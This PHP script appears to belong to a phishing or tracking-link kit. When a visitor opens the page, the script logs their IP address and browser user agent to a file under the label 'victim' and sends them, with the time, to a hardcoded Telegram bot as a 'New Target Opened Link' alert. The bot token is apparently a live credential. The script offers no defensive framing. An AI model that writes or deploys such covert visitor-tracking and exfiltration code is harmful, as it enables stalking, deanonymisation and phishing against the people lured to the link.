<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);

fclose($fp);

// Send to Telegram
$telegram_token = '8521921495:AAGfOpflwL4sgEnxdb9ZsB1OiZdqE7Ap73I';
$telegram_chat = '6452968857';

// Escape special characters in message
$ip_clean = trim($ipaddress);
$browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
$message = "🔔 *New Target Opened Link*\n\n";
$message .= "📍 *IP Address:* " . $ip_clean . "\n";
$message .= "🌐 *User Agent:* " . $browser_clean . "\n";
$message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";

$url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
$data = array(
    'chat_id' => $telegram_chat,
    'text' => $message,
    'parse_mode' => 'Markdown'
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10,
        'ignore_errors' => true
    )
);

$context = stream_context_create($options);
$result = @file_get_contents($url, false, $context);

// Log errors if any
if ($result === false) {
    $error = error_get_last();
    if ($error !== null) {
        error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
    }
}
